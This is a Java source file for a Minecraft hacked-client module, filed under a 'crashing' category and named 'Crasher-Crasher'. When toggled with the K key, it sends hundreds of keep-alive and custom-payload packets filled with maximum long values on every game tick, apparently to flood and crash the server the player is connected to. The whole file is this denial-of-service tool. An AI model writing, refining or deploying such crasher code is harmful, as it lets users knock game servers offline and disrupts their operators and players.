package dev.o2w9d8.client.module.crashing;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C00PacketKeepAlive;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.lwjgl.input.Keyboard;
import dev.o2w9d8.client.module.Category;
import dev.o2w9d8.client.module.Module;

public class KeepAliveCModule extends Module {

	private long PACKET_COUNT = Long.MAX_VALUE;
	private long PACKET_VALUE = Long.MAX_VALUE;

	public KeepAliveCModule() {
		super("2w9d8_Crasher-Crasher", Keyboard.KEY_K, Category.CRASHING);
	}

	@Override
	public void onUpdate() {
		if (this.isToggled()) {
			sendPackets();
		}
	}

	private void sendPackets() {
		String channel = "custom_packets";

		for (long i = 15; i < 1000; i++) {
			// Create the custom payload packet
			ByteBuf payload = Unpooled.buffer();
			payload.writeLong(PACKET_VALUE);
			sendKeepAlivePacket();
			sendCustomPayload(channel, payload);
		}
	}

	private void sendCustomPayload(String channel, ByteBuf payload) {
		Minecraft minecraft = Minecraft.getMinecraft();
		C17PacketCustomPayload packet = new C17PacketCustomPayload(channel, new PacketBuffer(payload));
		minecraft.getNetHandler().addToSendQueue(packet);
	}

	private void sendKeepAlivePacket() {
		Minecraft minecraft = Minecraft.getMinecraft();
		C00PacketKeepAlive packet = new C00PacketKeepAlive();
		minecraft.getNetHandler().addToSendQueue(packet);
	}
}
